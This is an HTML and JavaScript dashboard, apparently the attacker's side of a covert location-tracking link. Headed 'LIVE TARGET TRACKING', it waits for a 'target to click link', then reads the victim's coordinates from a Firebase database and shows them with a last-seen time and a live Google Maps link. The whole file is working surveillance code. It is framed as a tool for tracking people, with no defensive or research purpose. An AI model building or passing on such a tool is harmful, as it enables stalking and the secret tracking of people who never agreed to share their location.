<!DOCTYPE html>
<html>
<head>
    <title>Master Feed</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white font-mono p-6">
    <h1 class="text-xl border-b border-gray-700 mb-6">LIVE TARGET TRACKING</h1>
    
    <div id="display" class="space-y-4">
        <p class="text-gray-500">Waiting for target to click link...</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // PASTE THE SAME FIREBASE CONFIG HERE
        const firebaseConfig = { ... };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        onValue(ref(db, 'pings/active_session'), (snap) => {
            const d = snap.val();
            if (d) {
                document.getElementById('display').innerHTML = `
                    <div class="bg-black p-4 rounded border-l-4 border-green-500">
                        <p class="text-green-500 font-bold">TARGET ACTIVE</p>
                        <p class="text-xs text-gray-400 mt-1">LAST SEEN: ${d.time}</p>
                        <div class="mt-4">
                            <a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank" 
                               class="bg-blue-600 px-4 py-2 rounded text-sm hover:bg-blue-700">
                               VIEW LIVE MAP
                            </a>
                        </div>
                    </div>
                `;
            }
        });
    </script>
</body>
</html>
